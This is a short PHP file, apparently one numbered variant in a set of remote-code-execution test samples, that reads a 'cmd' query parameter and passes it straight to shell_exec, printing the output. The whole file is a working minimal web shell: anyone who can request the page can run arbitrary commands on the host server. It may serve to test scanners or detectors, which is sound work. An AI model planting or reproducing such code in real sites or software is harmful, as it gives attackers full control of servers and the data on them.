<?php
// RCE test variation #1012
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>